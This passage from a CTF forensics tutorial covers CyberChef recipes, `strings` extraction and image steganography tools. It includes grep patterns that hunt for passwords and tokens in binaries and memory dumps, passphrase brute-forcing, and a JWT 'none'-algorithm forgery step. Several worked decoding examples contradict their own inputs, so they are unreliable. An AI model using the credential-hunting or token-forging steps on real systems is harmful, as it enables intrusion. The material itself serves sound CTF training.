Example input: SGVsbG8lMjBXb3JsZA==
→ Base64 decode → Hex decode → ROT13 → URL decode → flag
```

**Recipe 2: XOR Analysis**

```
Operation chain:
1. From Hex
2. XOR Brute Force
   - Key length: 1
   - Sample length: 100
   - Print key: true

Automatically tries all single-byte XOR keys
```

**Recipe 3: Image Metadata**

```
Operation chain:
1. From Base64 (if encoded)
2. Extract EXIF
3. Strings (to find hidden text)

Reveals image metadata and embedded strings
```

**Recipe 4: JWT Analysis**

```
Operation chain:
1. JWT Decode
2. JSON Beautify

Example:
eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c

Reveals header, payload, and signature components
```

**Recipe 5: Hash Identification**

```
Operation chain:
1. Analyze hash
2. From Hex (if needed)

Identifies hash type from length/format:
- 32 chars = MD5
- 40 chars = SHA1
- 64 chars = SHA256
```

**Recipe 6: Zip File Analysis**

```
Operation chain:
1. From Hex (if hex-encoded)
2. Unzip
3. Parse file headers
4. Strings

Extract and analyze ZIP contents
```

**Advanced Techniques**:

**Nested Decoding Chain**:

```
Real CTF example: data encoded multiple times

Recipe:
1. URL Decode
2. From Base64
3. Gunzip
4. From Hex
5. XOR (key: "CTF")
6. From Base64
7. ROT13

Each operation feeds into the next automatically
```

**Conditional Processing (Magic Operation)**:

```
Magic operation automatically:
- Detects encoding
- Applies appropriate decoder
- Chains multiple decodings

Usage:
1. Paste unknown encoded data
2. Add "Magic" operation
3. Set intensive mode for deeper analysis

Very useful when encoding scheme is unknown
```

**Custom XOR Key Finding**:

```
When you know plaintext fragment:

Recipe:
1. From Hex (ciphertext)
2. XOR
   - Input: Known plaintext (hex)
   - Operation: XOR
3. Result shows key

Then use discovered key to decrypt full message
```

**File Carving from Hex Dump**:

```
Recipe:
1. From Hex Dump
   - Parse hex dump format
2. Parse file signatures
3. Extract files

Useful for memory dumps and hex-encoded files
```

**Practical CTF Workflows**:

**Workflow 1: Unknown Encoding**

```
Step 1: Use "Magic" operation
  - Set depth: 3-5
  - Enable intensive mode
  
Step 2: If Magic fails, try common patterns:
  - From Base64
  - From Hex
  - URL Decode
  - ROT13
  
Step 3: Look at output for clues:
  - Readable text = success
  - More gibberish = wrong path or multi-layer
```

**Workflow 2: Image Steganography**

```
Recipe for image analysis:
1. Remove EXIF (to see if data changes)
2. Extract LSB (Least Significant Bit)
   - Red: 1 bit
   - Green: 1 bit  
   - Blue: 1 bit
3. From Binary
4. Magic operation

Tests for LSB steganography
```

**Workflow 3: Network Packet Analysis**

```
Recipe:
1. From Hex Dump (packet capture hex)
2. Parse IPv4 header
3. Parse TCP header (if applicable)
4. Extract HTTP payload
5. URL Decode
6. From Base64 (if encoded)
```

**Workflow 4: Binary Protocol Analysis**

```
Recipe:
1. From Hex
2. To Hex (with formatting)
   - Delimiter: Space
   - Bytes per line: 16
3. Strings
4. Entropy (to find encrypted sections)
```

**Script Integration (Headless)**:

```bash
# CyberChef has a Node.js API for automation

# Install
npm install --save cyberchef

# JavaScript example
const chef = require("cyberchef");

// Simple operation
const output = chef.bake("SGVsbG8gV29ybGQ=", [
    {op: "From Base64", args: []}
]);
console.log(output.toString());

# Python wrapper (unofficial)
pip3 install pycyberchef

python3 << 'EOF'
from pycyberchef import CyberChef

# Create instance
cyber = CyberChef()

# Apply recipe
result = cyber.bake(
    input_data="5468697320697320612074657374",
    recipe=[
        {"op": "From Hex", "args": []},
        {"op": "ROT13", "args": [True, True, 13]}
    ]
)

print(result)
EOF
```

**Custom Operation Chains**:

```javascript
// Save and reuse recipes
const recipe = [
    {op: "From Base64", args: []},
    {op: "From Hex", args: ["Auto"]},
    {op: "XOR", args: [{string: "key", option: "UTF8"}, "Standard", false]},
    {op: "ROT13", args: [true, true, 13]}
];

// Export recipe as JSON
// CyberChef UI: Save recipe button → Copy JSON
```

**Useful Operation Combinations**:

**Finding XOR Key with Known Plaintext**:

```
Given: Encrypted data and known plaintext start

Recipe:
1. Load encrypted data (hex)
2. "XOR" operation with known plaintext
3. "To Hex" to see key pattern
4. If repeating pattern found = key length
5. Use discovered key on full ciphertext

Example:
Ciphertext: 1c0e070a1b1c0a
Known plaintext starts with: "flag"
XOR: shows repeating pattern = key
```

**Multi-Stage Compression**:

```
Recipe for deeply compressed data:
1. Unzip
2. Gunzip  
3. Bzip2 Decompress
4. Raw Inflate
5. Magic (to catch any additional encoding)

Handles nested compression common in CTFs
```

**Unicode and Character Set Issues**:

```
Recipe for encoding problems:
1. Encode text (UTF-8)
2. Decode text (ISO-8859-1)
3. Or: "Transcode" operation
   - From: Windows-1252
   - To: UTF-8
```

**Binary to Text Conversions**:

```
Recipe:
1. From Binary (8-bit chunks)
2. From Hex (if result is hex)
3. URL Decode (if result looks URL-encoded)
4. From Base64 (if result is base64)

Chains common text-encoding schemes
```

**Regular Expression Operations**:

```
"Find / Replace" operation with regex:

Example 1: Extract all hex values
Find: ([0-9a-fA-F]{2})
Replace: Leave empty, use "List matches"

Example 2: Extract email addresses  
Find: [a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}

Example 3: Clean hex dump
Find: ^[0-9a-f]+:\s+
Replace: (empty)
```

**Data Format Transformations**:

```
JSON to CSV:
1. JSON Parse
2. JPath expression (extract specific fields)
3. To CSV

CSV to JSON:
1. From CSV
2. To JSON

XML to JSON:
1. XML Parse
2. To JSON
```

**Entropy and Randomness Analysis**:

```
Recipe for identifying encrypted sections:
1. Entropy (sliding window)
   - Window size: 256
2. Result shows entropy graph
   - High entropy (>7.5) = encrypted/compressed
   - Low entropy (<5.0) = plaintext/structured
```

**Hash Cracking Integration**:

```
While CyberChef doesn't crack hashes directly:

Recipe for hash analysis:
1. Analyze hash (identifies type)
2. Generate hash (verify matches)
3. Compare with dictionary
   - Use "From CSV" to load wordlist
   - Use "Filter" to match hash
```

**Image Manipulation**:

```
Operations:
- Resize Image
- Rotate Image  
- Blur Image
- Render Image
- Extract LSB (steganography)
- View Bit Plane

Recipe for LSB extraction:
1. Load image (drag & drop)
2. Extract LSB
   - Red: 1 bit
   - Green: 1 bit
   - Blue: 1 bit
3. From Binary
4. Magic (auto-detect encoding)
```

**Network Protocol Parsing**:

```
Recipe for HTTP request analysis:
1. From Hex Dump (if in hex)
2. Parse HTTP request
3. URL Decode (query parameters)
4. From Base64 (if data is encoded)

Recipe for TCP stream:
1. From Hex
2. Parse TCP
3. Extract payload
4. Gunzip (if compressed HTTP)
```

**Certificate and Key Analysis**:

```
Recipe for X.509 certificates:
1. PEM to Hex
2. Parse X.509 certificate
3. Extract fields (subject, issuer, validity)

Recipe for RSA keys:
1. Parse PEM
2. Parse ASN.1
3. Extract modulus, exponents
```

**Baking Multiple Inputs**:

```
CyberChef "Fork" operation:

Recipe for batch processing:
1. Input: Multiple lines of data
2. Fork (split by newline)
3. From Base64 (applied to each)
4. Merge (combine results)

Processes each line independently through recipe
```

**Real-World CTF Examples** [Inference]:

```
Example 1: Multi-layer obfuscation
Input: JTQxJTQxJTQxJTQx...

Recipe:
1. URL Decode → !!!! (repeated)
2. From Base64 → hex string
3. From Hex → binary data
4. XOR Brute Force → finds key=0x42
5. Result: flag{...}

Example 2: Image with embedded ZIP
Input: PNG file upload

Recipe:
1. Extract Files (detects appended ZIP)
2. Unzip
3. From Base64 (if contents encoded)
4. Magic (final decode)

Example 3: JWT token manipulation
Input: JWT token

Recipe:
1. JWT Decode (view payload)
2. JWT Sign (with "none" algorithm)
   - Exploit algorithm confusion
3. Output: Modified token
```

**Keyboard Shortcuts**:

```
Ctrl+Enter    - Bake (execute recipe)
Ctrl+Shift+B  - Auto-bake toggle
Ctrl+S        - Save recipe
Ctrl+O        - Load recipe
Ctrl+Z        - Undo
Ctrl+Shift+Z  - Redo
Drag & Drop   - Add operation to recipe
```

**Tips and Tricks**:

```
1. Auto Bake: Enable for real-time results as you build recipe

2. Breakpoints: Click operation to set breakpoint
   - See intermediate results
   - Debug multi-stage recipes

3. Comments: Right-click operation → Add comment
   - Document complex recipes

4. Disable operations: Toggle operations on/off
   - Test recipe variations

5. Save recipes: Bookmark or export JSON
   - Build personal library of common patterns

6. Input/Output formats:
   - Text (default)
   - Hex
   - Base64
   - File (drag & drop)

7. Flow control:
   - Jump (conditional branching)
   - Label (jump targets)
   - Register (store intermediate values)
```

**Common Pitfalls**:

```
1. Character encoding issues
   - Use "Encode text" or "Decode text" to fix

2. Hex format variations
   - "From Hex" has multiple format options
   - Try "Auto" or specific delimiter

3. Compression before encryption
   - Order matters: decompress before decrypt

4. Binary data display
   - Use "To Hex" or "To Base64" for visibility

5. Large file handling
   - Browser memory limits (~100MB)
   - Use desktop/CLI version for larger files
```

**Integration with Other Tools**:

```bash
# Export CyberChef output to file
# 1. Bake recipe
# 2. Click "Save output to file"
# 3. Process with other tools

# Example pipeline
cyberchef_output.bin | xxd | grep "flag"
cat cyberchef_output.txt | strings | grep -E "CTF{.*}"

# Automate with headless CyberChef
node cyberchef_script.js < input.dat > output.txt
```

**Performance Considerations**:

```
For large files:
- Disable auto-bake
- Use "Load file" instead of paste
- Process in chunks if possible
- Consider CLI version for automation

Optimal operations order:
1. Decompress first (reduces data size)
2. Decode (hex, base64)
3. Decrypt
4. Parse/analyze
```

### strings (embedded data)

`strings` extracts printable character sequences from binary files, revealing embedded text, URLs, passwords, commands, and other human-readable data hidden in executables, images, or memory dumps. Essential for quick reconnaissance and finding flags in CTF challenges.

**Basic Usage**:

```bash
# Extract all printable strings (default: 4+ chars)
strings file.bin

# Set minimum string length
strings -n 8 file.bin
# Only strings 8+ characters

strings -n 3 file.bin
# Include very short strings (3+ chars)

# Show file offset of each string
strings -t d file.bin
# -t d: Decimal offset
# -t x: Hexadecimal offset
# -t o: Octal offset

# Scan entire file (including data sections)
strings -a file.bin
# Default only scans loaded sections of executables
```

**Encoding Options**:

```bash
# Default: 7-bit ASCII (s encoding)
strings -e s file.bin

# 8-bit characters (Latin-1)
strings -e S file.bin

# 16-bit little-endian (Unicode)
strings -e l file.bin

# 16-bit big-endian
strings -e b file.bin

# 32-bit little-endian
strings -e L file.bin

# 32-bit big-endian
strings -e B file.bin

# All encodings
strings -e s -e S -e l -e b file.bin
```

**CTF-Focused Techniques**:

```bash
# Find flags with common patterns
strings file.bin | grep -E "(flag|FLAG|CTF){.*}"
strings file.bin | grep -iE "flag{[^}]+}"
strings file.bin | grep -E "[A-Za-z0-9+/]{20,}={0,2}"  # Base64

# Find URLs and IPs
strings file.bin | grep -E "https?://"
strings file.bin | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"

# Find credentials
strings file.bin | grep -iE "(password|passwd|pwd|user|admin)"
strings file.bin | grep -iE "(api[_-]?key|token|secret)"

# Find email addresses
strings file.bin | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

# Find file paths
strings file.bin | grep -E "^(/|C:\\|\\\\)"
strings file.bin | grep -E "\.(txt|conf|key|pem|log)$"
```

**Advanced Filtering**:

```bash
# Only unique strings
strings file.bin | sort -u

# Sort by length
strings file.bin | awk '{print length, $0}' | sort -rn | head -20

# Only alphabetic strings (no numbers/symbols)
strings file.bin | grep -E "^[A-Za-z]+$"

# Only strings with high entropy (potential encoded data)
strings file.bin | while read line; do
    entropy=$(echo "$line" | python3 -c "
import sys, math
from collections import Counter
s = sys.stdin.read().strip()
freq = Counter(s)
ent = -sum((c/len(s)) * math.log2(c/len(s)) for c in freq.values())
print(f'{ent:.2f}')
")
    if (( $(echo "$entropy > 4" | bc -l) )); then
        echo "$line (entropy: $entropy)"
    fi
done

# Strings with specific character sets
strings file.bin | grep -E "^[0-9a-fA-F]+$"  # Hex strings
strings file.bin | grep -E "^[A-Za-z0-9+/=]+$"  # Base64 candidates
```

**Targeted Extraction**:

```bash
# Extract from specific file offset
strings -t x file.bin | awk '$1 >= "0x1000" && $1 <= "0x2000"'

# Extract from ELF sections
readelf -p .rodata executable | grep flag
readelf -p .data executable

# Extract from PE sections
strings -e l executable.exe | grep -i "flag"  # Unicode strings common in Windows

# Extract from memory dumps
strings memory.dmp | grep -E "password|secret" | sort -u

# Extract from images (steganography check)
strings image.jpg | tail -n 50  # Check end of file
strings image.png | grep -E "^[A-Za-z0-9+/]{40,}={0,2}$"  # Possible base64
```

**Combined with Other Tools**:

```bash
# strings + binwalk
binwalk -e file.bin
strings _file.bin.extracted/* | grep flag

# strings + xxd (with offsets)
strings -t x file.bin | while read offset string; do
    echo "Offset: $offset - String: $string"
    xxd -s $offset -l 64 file.bin
done

# strings + file identification
for f in *; do
    echo "=== $f ==="
    file $f
    strings $f | head -n 10
    echo
done

# strings + grep + context
strings -n 6 file.bin | grep -B 2 -A 2 "flag"

# strings with hex output
strings -t x file.bin | awk '{print $1}' | while read offset; do
    xxd -s $offset -l 32 file.bin
done
```

**Scripted Analysis**:

```bash
#!/bin/bash
# comprehensive_strings.sh - Advanced string extraction

FILE="$1"
OUTPUT_DIR="${FILE}_strings_analysis"

mkdir -p "$OUTPUT_DIR"
cd "$OUTPUT_DIR"

echo "[*] Extracting ASCII strings..."
strings -n 4 "../$FILE" > ascii_4.txt
strings -n 8 "../$FILE" > ascii_8.txt
strings -n 16 "../$FILE" > ascii_16.txt

echo "[*] Extracting Unicode strings..."
strings -e l "../$FILE" > unicode_le.txt
strings -e b "../$FILE" > unicode_be.txt

echo "[*] Finding potential flags..."
grep -iE "(flag|ctf){" ascii_*.txt unicode_*.txt > potential_flags.txt

echo "[*] Finding URLs..."
grep -hE "https?://" *.txt | sort -u > urls.txt

echo "[*] Finding base64 candidates..."
grep -hE "^[A-Za-z0-9+/]{20,}={0,2}$" *.txt | sort -u > base64_candidates.txt

echo "[*] Finding credentials..."
grep -ihE "(password|passwd|api.?key|token)" *.txt > credentials.txt

echo "[*] Extracting high-entropy strings..."
cat ascii_8.txt | while read line; do
    entropy=$(echo "$line" | python3 -c "
import sys, math
from collections import Counter
s = sys.stdin.read().strip()
if len(s) < 8: sys.exit(0)
freq = Counter(s)
ent = -sum((c/len(s)) * math.log2(c/len(s)) for c in freq.values())
if ent > 4.5:
    print(s)
")
    [ -n "$entropy" ] && echo "$entropy" >> high_entropy.txt
done

echo "[*] Analysis complete. Results in: $OUTPUT_DIR"
ls -lh
```

**Python Integration**:

```python
#!/usr/bin/env python3
"""
Advanced string extraction and analysis
"""

import re
import string
from collections import Counter
import math

def extract_strings(filename, min_length=4, encodings=['ascii', 'utf-16-le']):
    """
    Extract strings from binary file with multiple encodings
    """
    results = []
    
    with open(filename, 'rb') as f:
        data = f.read()
    
    for encoding in encodings:
        try:
            if encoding == 'ascii':
                # Manual ASCII extraction (printable chars)
                current = b''
                for byte in data:
                    if 32 <= byte <= 126:  # Printable ASCII range
                        current += bytes([byte])
                    else:
                        if len(current) >= min_length:
                            results.append(current.decode('ascii'))
                        current = b''
            else:
                # Try other encodings
                decoded = data.decode(encoding, errors='ignore')
                # Extract printable sequences
                for match in re.finditer(r'[\x20-\x7E]{%d,}' % min_length, decoded):
                    results.append(match.group())
        except:
            continue
    
    return list(set(results))  # Remove duplicates

def calculate_entropy(s):
    """Calculate Shannon entropy of string"""
    if not s:
        return 0
    
    freq = Counter(s)
    entropy = -sum((count/len(s)) * math.log2(count/len(s)) 
                   for count in freq.values())
    return entropy

def find_interesting_strings(filename):
    """
    Find potentially interesting strings
    """
    strings_list = extract_strings(filename, min_length=4)
    
    interesting = {
        'flags': [],
        'urls': [],
        'emails': [],
        'credentials': [],
        'base64': [],
        'high_entropy': []
    }
    
    for s in strings_list:
        # Flag patterns
        if re.search(r'(flag|ctf){', s, re.I):
            interesting['flags'].append(s)
        
        # URLs
        if re.match(r'https?://', s):
            interesting['urls'].append(s)
        
        # Emails
        if re.match(r'[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}', s):
            interesting['emails'].append(s)
        
        # Credential keywords
        if re.search(r'(password|passwd|secret|key|token)', s, re.I):
            interesting['credentials'].append(s)
        
        # Base64 candidates (length multiple of 4, valid charset)
        if len(s) >= 16 and len(s) % 4 == 0:
            if re.match(r'^[A-Za-z0-9+/]+=*$', s):
                interesting['base64'].append(s)
        
        # High entropy (potential encoded/encrypted)
        if len(s) >= 16:
            entropy = calculate_entropy(s)
            if entropy > 4.5:
                interesting['high_entropy'].append((s, entropy))
    
    return interesting

# Example usage
if __name__ == "__main__":
    import sys
    
    if len(sys.argv) < 2:
        print("Usage: python3 strings_analysis.py <file>")
        sys.exit(1)
    
    filename = sys.argv[1]
    results = find_interesting_strings(filename)
    
    for category, items in results.items():
        if items:
            print(f"\n[*] {category.upper()}:")
            for item in items[:10]:  # Show first 10
                if isinstance(item, tuple):
                    print(f"    {item[0]} (entropy: {item[1]:.2f})")
                else:
                    print(f"    {item}")
```

**Specific File Type Analysis**:

```bash
# ELF executables
strings -a executable | grep -E "(password|flag|key)"
readelf -p .rodata executable | strings

# Windows PE files
strings -e l executable.exe | grep -i "flag"
strings -e l executable.exe | grep -E "^[A-Z]:\\.*"

# PDF files
strings document.pdf | grep -E "^/.*$"  # PDF objects
strings document.pdf | grep -oE "https?://[^ ]+"

# Office documents (DOCX, XLSX - actually ZIP files)
unzip -p document.docx | strings | grep flag

# Memory dumps
strings -a memory.dmp | grep -E "password|secret" | sort -u
strings -e l memory.dmp | grep -i "user"  # Unicode for Windows

# Disk images
strings -n 8 disk.img | grep -E "flag{.*}"
strings -t d disk.img | grep "password"  # With offsets

# Network captures (PCAP)
strings capture.pcap | grep -oE "https?://[^ ]+"
strings capture.pcap | grep -E "(username|password|auth)"
```

**Pattern-Based Extraction**:

```bash
# Extract all hex strings (32+ chars)
strings file.bin | grep -oE "[0-9a-fA-F]{32,}"

# Extract all base64-like strings
strings file.bin | grep -E "^[A-Za-z0-9+/]{16,}={0,2}$" | while read b64; do
    echo "Trying: $b64"
    echo "$b64" | base64 -d 2>/dev/null
done

# Extract email-like patterns
strings file.bin | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}"

# Extract IPv4 addresses
strings file.bin | grep -oE "\b([0-9]{1,3}\.){3}[0-9]{1,3}\b"

# Extract function/variable names (programming patterns)
strings file.bin | grep -E "^[a-z_][a-z0-9_]*$" | head -20

# Extract potential encryption keys
strings -n 16 file.bin | grep -E "^[0-9a-fA-F]{32,}$"

# Extract SQL queries
strings file.bin | grep -iE "^(SELECT|INSERT|UPDATE|DELETE).*"
```

**Performance Optimization**:

```bash
# For large files, limit scope
strings -n 8 -t x large_file.bin | grep flag
# Longer strings + hex offsets reduces output

# Process in parallel for multiple files
find . -type f -name "*.bin" | parallel strings {} | grep flag

# Only scan specific sections
objdump -s -j .rodata executable | strings

# Stream processing for huge files
cat huge_file.bin | strings -n 8 | grep -E "flag|password"
```

**False Positive Reduction**:

```bash
# Filter out common false positives
strings file.bin | grep -vE "^[A-Z]{3,}$"  # Exclude all-caps
strings file.bin | grep -vE "^[@#$%^&*]{3,}"  # Exclude symbol strings
strings file.bin | grep -vE "^ +$"  # Exclude whitespace-only

# Only dictionary words (requires wordlist)
strings file.bin | grep -Fxf /usr/share/dict/words

# Statistical filtering (Python)
strings file.bin | python3 << 'EOF'
import sys
import string

for line in sys.stdin:
    line = line.strip()
    if len(line) < 8:
        continue
    
    # Calculate character diversity
    unique_chars = len(set(line))
    if unique_chars < 4:  # Too repetitive
        continue
    
    # Check if mostly alphanumeric
    alnum_count = sum(c.isalnum() for c in line)
    if alnum_count / len(line) < 0.8:
        continue
    
    print(line)
EOF
```

**Real-World CTF Examples** [Inference]:

```bash
# Example 1: Flag in ELF binary
strings challenge | grep -E "flag{.*}"
# Output: flag{h1dd3n_1n_b1n4ry}

# Example 2: Base64 in image
strings image.png | tail -n 5 | head -n 1 | base64 -d
# Reveals hidden message

# Example 3: URL in firmware
strings firmware.bin | grep "http" | sort -u
# Finds: http://admin:password@192.168.1.1/flag.txt

# Example 4: Unicode password in memory dump
strings -e l memory.dmp | grep -i "password" -A 2
# Finds: Password: CTF{...}

# Example 5: Hex-encoded key
strings binary | grep -oE "[0-9a-f]{64}" | head -n 1
# Extract 256-bit key in hex
```

**Integration Script**:

```bash
#!/bin/bash
# strings_ctf_helper.sh - Comprehensive CTF string extraction

FILE="$1"

if [ -z "$FILE" ] || [ ! -f "$FILE" ]; then
    echo "Usage: $0 <file>"
    exit 1
fi

echo "[*] File: $FILE"
file "$FILE"
echo

echo "[*] Quick flag check..."
strings "$FILE" | grep -iE "(flag|ctf){" && echo "[+] Possible flag found!" || echo "[-] No obvious flags"
echo

echo "[*] URLs found:"
strings "$FILE" | grep -oE "https?://[^ ]+" | sort -u
echo

echo "[*] Email addresses:"
strings "$FILE" | grep -oE "[a-zA-Z0-9._%+-]+@[a-zA-Z0-9.-]+\.[a-zA-Z]{2,}" | sort -u
echo

echo "[*] Potential credentials:"
strings "$FILE" | grep -iE "(password|passwd|user|admin)" | head -10
echo

echo "[*] Base64-like strings (trying to decode):"
strings "$FILE" | grep -E "^[A-Za-z0-9+/]{20,}={0,2}$" | while read b64; do
    decoded=$(echo "$b64" | base64 -d 2>/dev/null)
    if [ $? -eq 0 ] && [ -n "$decoded" ]; then
        echo "  $b64 → $decoded"
    fi
done
echo

echo "[*] High-entropy strings (possible encryption):"
strings -n 16 "$FILE" | head -10
```

**Key Takeaways**:

1. **Default behavior**: 4+ printable ASCII characters
2. **Encoding matters**: Use `-e l` for Unicode/UTF-16 in Windows binaries
3. **Length filtering**: Adjust `-n` based on target (longer = less noise)
4. **Combine with grep**: Essential for finding specific patterns
5. **Check file ends**: `strings file | tail` often reveals appended data
6. **Offset tracking**: `-t x` helps locate strings in hex editors

---

# STEGANOGRAPHY & COVERT CHANNELS

## Image Steganography

Image steganography conceals data within digital image files by exploiting imperceptible modifications to pixel values, file structure, or transform coefficients. CTF challenges frequently combine multiple techniques, requiring systematic analysis and tool proficiency.

### LSB (Least Significant Bit) Insertion

LSB insertion modifies the least significant bits of pixel color channels to embed hidden data. This technique exploits the human eye's inability to detect minor color variations (typically changes of ±1 in 8-bit color values).

#### Detection and Extraction Methodology

**Initial Analysis with `file` and `exiftool`:**
```bash
file image.png
exiftool image.png
```
Check metadata for anomalies: unusual dimensions, editor information, or embedded comments.

**Visual Analysis with `stegsolve`:**
```bash
stegsolve image.png
```
Critical operations:
- Cycle through all bit planes (Red/Green/Blue/Alpha planes 0-7)
- Apply "Data Extract" → select bit planes → choose LSB first or MSB first
- Try all combinations: LSB of each color channel, multiple planes combined
- Check "File Format" analysis for embedded file signatures

**Automated LSB Extraction with `zsteg` (PNG/BMP):**
```bash
zsteg image.png              ## Scan all LSB combinations
zsteg -a image.png           ## All known methods
zsteg -E image.png           ## Extract all embedded data
zsteg -E "b1,rgb,lsb" image.png > extracted.dat
```
Common patterns:
- `b1,rgb,lsb` = 1 bit per channel, RGB order, LSB first
- `b1,bgr,lsb` = BGR color order (common in BMP)
- `b2,rgb,lsb` = 2 bits per channel
- `b8,r,lsb` = Full red channel extraction

**Manual LSB Extraction with `steghide` (JPEG/BMP/WAV/AU):**
```bash
steghide info image.jpg           ## Check for embedded data
steghide extract -sf image.jpg    ## Extract with passphrase prompt
steghide extract -sf image.jpg -p "password" -xf output.txt
```

**Python-based LSB Extraction:**
```python
from PIL import Image
import numpy as np

img = Image.open('image.png')
pixels = np.array(img)

## Extract LSB from red channel
lsb_data = pixels[:,:,0] & 1
## Flatten and convert to binary string
bits = ''.join(lsb_data.flatten().astype(str))
## Convert to bytes
extracted = int(bits, 2).to_bytes(len(bits)//8, byteorder='big')
```

#### Embedding Data (for verification/testing)

**Using `steghide`:**
```bash
steghide embed -cf cover.jpg -ef secret.txt -p "password"
steghide embed -cf cover.jpg -ef secret.txt -p "" -Z  ## No compression
```

**Using `stegpy`:**
```bash
pip install stegpy
stegpy secret.txt cover.png
stegpy --extract cover.png
```

#### Common CTF Patterns

[Inference] Based on typical CTF construction:
- LSB data often starts with magic bytes (`\x89PNG`, `PK\x03\x04` for ZIP, `flag{`)
- Check for bit-plane ordering variations: some tools use BGR instead of RGB
- Multi-stage: LSB extraction reveals coordinates/passwords for next step

### Spatial Domain Hiding

Spatial domain techniques modify pixel values directly in image space, beyond simple LSB manipulation.

#### Advanced Pixel Manipulation

**Pixel Value Differencing (PVD):**
Data embedded in differences between adjacent pixels. [Unverified: Detection requires custom scripts as mainstream tools don't automate PVD extraction]

**Palette-Based Steganography (GIF/PNG with indexed color):**
```bash
convert image.gif -verbose info:  ## Check for unusual palette
exiftool image.gif | grep -i palette
```
Hidden data may be in:
- Unused palette entries
- Palette ordering (EzStego technique)
- Color table index LSBs

**Using `stegdetect` for pattern recognition:**
```bash
stegdetect image.jpg           ## Detect jphide, jsteg, outguess, invisible secrets
stegdetect -s 10.0 image.jpg   ## Sensitivity adjustment (1.0-10.0)
```

**`outguess` extraction:**
```bash
outguess -r image.jpg output.txt        ## Extract hidden data
outguess -r image.jpg -k "key" output.txt  ## With passphrase
```

#### Pixel Pattern Analysis

**Using `binwalk` for embedded files:**
```bash
binwalk image.png
binwalk -e image.png           ## Extract identified files
binwalk --dd='.*' image.png    ## Extract all signatures
```

**Histogram Analysis:**
```python
from PIL import Image
import matplotlib.pyplot as plt

img = Image.open('image.png')
plt.hist(img.histogram(), bins=256)
plt.show()  ## Look for unusual spikes or patterns
```

[Inference] Spatial domain hiding often produces detectable statistical anomalies in histograms or chi-square tests.

### Frequency Domain Hiding (DCT, DWT)

Frequency domain steganography embeds data in transform coefficients, offering better robustness against compression and manipulation.

#### DCT (Discrete Cosine Transform) Analysis

**JPEG DCT Coefficient Extraction:**
```bash
jsteg reveal image.jpg output.txt     ## Extract jsteg-hidden data
```

**Using `stegbreak` for brute-forcing:**
```bash
stegbreak -t p -f wordlist.txt image.jpg  ## Brute force jphide
stegbreak -t o -f wordlist.txt image.jpg  ## Brute force outguess
```

**Manual DCT Analysis with Python:**
```python
import cv2
import numpy as np

img = cv2.imread('image.jpg', 0)  ## Grayscale
dct = cv2.dct(np.float32(img))

## Analyze specific frequency bands
low_freq = dct[0:8, 0:8]    ## Low frequencies (top-left)
high_freq = dct[-8:, -8:]    ## High frequencies (bottom-right)
## Data typically hidden in mid-frequency coefficients
```

#### DWT (Discrete Wavelet Transform) Analysis

[Unverified: Mainstream CTF tools have limited automated DWT steganography detection]

**Manual DWT Decomposition:**
```python
import pywt
from PIL import Image
import numpy as np

img = np.array(Image.open('image.png').convert('L'))
coeffs = pywt.dwt2(img, 'haar')  ## Haar wavelet
cA, (cH, cV, cD) = coeffs

## Check LSBs of detail coefficients
detail_lsb = (cD.astype(int) & 1)
```

**Common wavelet families in CTFs:**
- `haar` - Simplest, fastest
- `db1` through `db10` - Daubechies wavelets
- `sym2` through `sym8` - Symlets
- `coif1` through `coif5` - Coiflets

#### F5 Algorithm Detection

F5 is a sophisticated JPEG steganography algorithm that modifies DCT coefficients while preserving statistics.

**Using `stegexpose`:**
```bash
stegexpose image.jpg output_directory
```

[Inference] F5 detection requires statistical analysis; no reliable extraction tool exists without the correct password/algorithm implementation.

### JPEG Steganography

JPEG-specific techniques exploit compression artifacts and DCT quantization.

#### JPEG Structure Analysis

**Using `jpegsnoop` (Windows) or `jpeginfo` (Linux):**
```bash
jpeginfo -c image.jpg          ## Check for errors
jpegoptim --strip-all image.jpg  ## Remove all metadata for comparison
```

**Comment Field Extraction:**
```bash
exiftool image.jpg | grep -i comment
strings image.jpg | grep -E "flag|password|secret"
```

**JPEG Quantization Table Analysis:**
```bash
identify -verbose image.jpg | grep -A 50 "Quantum"
```
[Inference] Modified quantization tables may indicate steganography presence.

#### JPEG-Specific Tools

**`jsteg` extraction:**
```bash
jsteg reveal image.jpg output.txt
```

**`steghide` (most common for JPEG CTFs):**
```bash
steghide info image.jpg
steghide extract -sf image.jpg -xf output.dat
## If password-protected, try common passwords:
steghide extract -sf image.jpg -p "" -xf output.dat
```

**`stegseek` (fast steghide brute-forcing):**
```bash
stegseek image.jpg wordlist.txt    ## Significantly faster than stegbreak
stegseek image.jpg                 ## Uses built-in rockyou.txt
```

#### End-of-File Appended Data

JPEG files may contain data appended after the `FFD9` (End of Image) marker:

```bash
## Find EOI marker position
grep -abo $'\xFF\xD9' image.jpg | tail -1

## Extract everything after EOI
dd if=image.jpg of=appended.dat bs=1 skip=<EOI_position+2>

## Or use binwalk
binwalk -e image.jpg
```

#### Combining Techniques

**Systematic CTF Workflow:**
```bash
## 1. Basic reconnaissance
file image.jpg && exiftool image.jpg

## 2. Check for appended data
binwalk image.jpg && strings image.jpg | less

## 3. LSB analysis
stegsolve image.jpg &           ## Manual bit-plane analysis
zsteg image.jpg                 ## If PNG

## 4. Steghide check
steghide info image.jpg
stegseek image.jpg rockyou.txt  ## If password-protected

## 5. Outguess attempt
outguess -r image.jpg output.txt

## 6. Statistical detection
stegdetect image.jpg
```

**Important Note:** [Unverified claim about tool effectiveness] Some tools may produce false negatives depending on the specific steganography implementation used. Always try multiple approaches when initial attempts fail.

#### Relevant Related Topics

For comprehensive CTF image analysis, you should also explore:
- **Forensic image analysis** (EXIF manipulation, thumbnail extraction, photoshop history)
- **Image manipulation detection** (error level analysis, clone detection)
- **QR codes and barcodes** embedded in images
- **Color channel manipulation** (red/green channel swapping, alpha channel secrets)

---

## Audio Steganography

